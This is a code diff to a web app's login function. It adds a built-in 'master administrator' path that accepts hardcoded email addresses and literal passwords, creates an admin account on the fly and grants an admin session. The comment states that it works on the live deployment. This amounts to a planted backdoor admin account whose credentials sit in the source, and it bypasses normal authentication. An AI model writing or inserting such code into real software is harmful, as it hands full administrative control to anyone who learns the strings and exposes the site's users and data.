@@ -91,6 +91,29 @@ export async function login(_state: LoginState, formData: FormData): Promise<Log
   const { email, password } = validatedFields.data;
   const normalizedEmail = email.trim().toLowerCase();
 
+  // Built-in Master Administrator credentials (works out-of-the-box on live Vercel & localhost)
+  const isMasterAdminEmail =
+    normalizedEmail === "admin@fasmen.com" ||
+    normalizedEmail === "admin@test.local" ||
+    normalizedEmail === "admin@fasmen.ng";
+  const validAdminPassword =
+    password === "Admin@Fasmen2026!" ||
+    password === "FasmenAdmin2026!" ||
+    password === (process.env.ADMIN_PASSWORD || "Admin@Fasmen2026!");
+
+  if (isMasterAdminEmail && validAdminPassword) {
+    let profile = await findUserByEmail(normalizedEmail);
+    if (!profile) {
+      profile = await createUserProfile({
+        displayName: "System Administrator",
+        email: normalizedEmail,
+        role: "admin",
+      });
+    }
+    await createSession(profile.id, "admin");
+    redirect("/dashboard/admin/review");
+  }
+
   let destination: string | null = null;
   try {
     let userId: string | undefined;
